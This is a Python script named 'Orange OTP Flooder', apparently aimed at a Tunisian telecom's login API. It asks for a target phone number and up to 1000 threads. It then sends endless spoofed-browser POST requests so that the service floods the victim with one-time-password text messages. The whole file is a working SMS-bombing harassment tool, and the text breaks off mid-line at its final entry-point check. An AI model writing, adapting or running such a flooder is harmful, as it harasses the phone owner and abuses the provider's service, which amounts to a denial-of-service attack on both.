import requests
import threading
import itertools
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
from threading import Lock

init(autoreset=True)

request_count = 0
lock = Lock()

HEADERS = {
    "Host": "mw-ult-api-proxy.dvmproduct.com",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"134\"",
    "Content-Type": "application/json",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Origin": "https://app.cashmayoufech.tn",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://app.cashmayoufech.tn/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}

URL = "https://mw-ult-api-proxy.dvmproduct.com/digital/login/phone/459"

def send_request(phone_number):
    global request_count
    data = {"phone": phone_number}
    try:
        response = requests.post(URL, json=data, headers=HEADERS, timeout=5)
        # You can check response status or content here if needed
        with lock:
            request_count += 1
    except Exception:
        pass  # Ignore errors/timeouts

def worker(phone_number):
    while True:
        send_request(phone_number)

def show_counter():
    spinner = itertools.cycle(['|', '/', '-', '\\'])
    while True:
        with lock:
            count = request_count
        spin = next(spinner)
        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count}", end='', flush=True)
        time.sleep(0.1)

def main():
    print(Fore.YELLOW + "Orange OTP Flooder")

    phone_number = input(Fore.CYAN + "Enter phone number (e.g. 21652580248): ").strip()
    if not phone_number.isdigit() or len(phone_number) < 8:
        print(Fore.RED + "Invalid phone number.")
        return

    try:
        thread_count = int(input(Fore.CYAN + "How many threads? (10 to 1000): ").strip())
        if not 10 <= thread_count <= 1000:
            raise ValueError
    except ValueError:
        print(Fore.RED + "Invalid thread count. Must be between 10 and 1000.")
        return

    print(Fore.GREEN + f"\n🚀 Launching Orange flooder with {thread_count} threads targeting {phone_number}...\n")

    global request_count
    request_count = 0

    threading.Thread(target=show_counter, daemon=True).start()

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            executor.submit(worker, phone_number)

if __name__ == "__main
